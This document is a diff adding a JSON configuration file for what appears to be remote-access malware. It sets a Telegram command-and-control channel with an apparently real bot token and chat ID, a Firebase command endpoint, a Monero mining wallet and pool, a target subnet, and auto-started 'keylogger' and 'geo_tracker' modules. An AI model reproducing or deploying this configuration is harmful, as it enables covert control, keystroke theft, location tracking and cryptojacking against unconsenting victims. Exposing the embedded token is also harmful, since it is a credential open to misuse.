@@ -1,0 +1,12 @@
+{
+    "c2_type": "telegram",
+    "telegram_token": "8956135458:AAF4LZiAnrOOyC7Nu-I8FIaeRIn6F0G2f68",
+    "telegram_chat_id": "752995113",
+    "firebase_url": "https://your-db.firebaseio.com/commands/{uid}.json",
+    "persistence": false,
+    "miner_wallet": "YOUR_MONERO_WALLET_ADDRESS",
+    "miner_pool": "pool.supportxmr.com:3333",
+    "target_ip": "192.168.1.1",
+    "subnet": "192.168.1.0/24",
+    "auto_start_modules": ["keylogger", "geo_tracker"]
+}
